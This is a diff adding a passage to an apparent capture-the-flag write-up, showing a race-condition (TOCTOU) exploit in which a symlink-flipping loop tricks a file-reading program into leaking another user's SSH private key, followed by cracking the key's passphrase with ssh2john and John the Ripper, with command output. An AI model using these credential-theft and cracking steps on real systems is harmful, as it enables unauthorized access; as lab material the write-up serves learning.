@@ -486,5 +486,68 @@ The code returns 0 if the file is successfully read and written to the standard 
 * The `__assert_fail` function is used to handle errors when opening the file.
 * The code uses a mix of 32-bit and 64-bit integer types, which may indicate that the code is intended to run on a 64-bit system.
 ```
+--> Research that we've known that is "Race Condition vulnerability"or call TOCTOU - Time-of-Check Time-of-User vulnerability.
+
+***Exploit Race Condition***
+
++ TOCTOU, which is 
+
++ Idea: We will create a script that creates a symbol link to the destination we want, in this case that is ./ssh/id_rsa. While the application perfoms the checks, we are hoping that it will see a regular file "id_rsa" and we will pass the checks. This script is run infinity. So at some point of execution, we've got the file we actually want to read.
++ First we will create a loop running in background switching files between these two states:
+```bash
+while true; do ln -sf /home/youcef/.ssh/id_rsa flip; rm flip; touch flip; done &
+
+#Note: If we run command in some directory /tmp, /home/youcef which a foler that does not belong to john, it will cause code will become the infinite loop and no content is leaked. Instead, this code will must be executed in john's home directory. 
+```
++ After run first command success, we will build a script that executes the application 20 times to read the RSA key form "youcef". After we run code, if nothing appears so we need to run some times repeat again to successfull.
+
+```bash
+for i in {1..20}; do /home/youcef/./readfile flip; done
+```
+
+![alt text](image-16.png)
+
++ RUN AGAIN!!!
+
+![alt text](image-17.png)
+
+---> We got it !!! Now we have the RSA key.
+
++ Copy the key to attack machine and try run SSH.
+
+```bash
+~/Documents/CTFs/Breakme$ sudo ssh youcef@10.10.253.8 -i id_rsa 
+[sudo] password for zicco: 
+The authenticity of host '10.10.253.8 (10.10.253.8)' can not be established.
+ED25519 key fingerprint is SHA256:7C+7KD5sXHHAuUddL4pe+CYqXj7LEWGqlWATdS4wRw8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.253.8' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+```
+--> We do not have passphrase. So we need to decrypt passphrase first.
+
++ We use ssh2john to extract passphrase form key RSA:
+
+```bash
+    zicco@z-a:~/src/john/run$ python3 ssh2john.py ~/Documents/CTFs/Breakme/id_rsa > key.txt 
+    zicco@z-a:/usr/share/wordlists$ ~/src/john/run/./john --wordlist=rockyou.txt ~/Documents/CTFs/Breakme/key.txt 
+[ssh-opencl] cipher value of 6 is not yet supported with OpenCL!
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+a123456          (/home/zicco/Documents/CTFs/Breakme/id_rsa)     
+1g 0:00:00:06 DONE (2024-10-26 11:48) 0.1621g/s 124.5p/s 124.5c/s 124.5C/s sunshine1..james1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
++ We had the passphrase "a123456" now we back to login SSH again.
+
+![alt text](image-18.png)
+
 
 
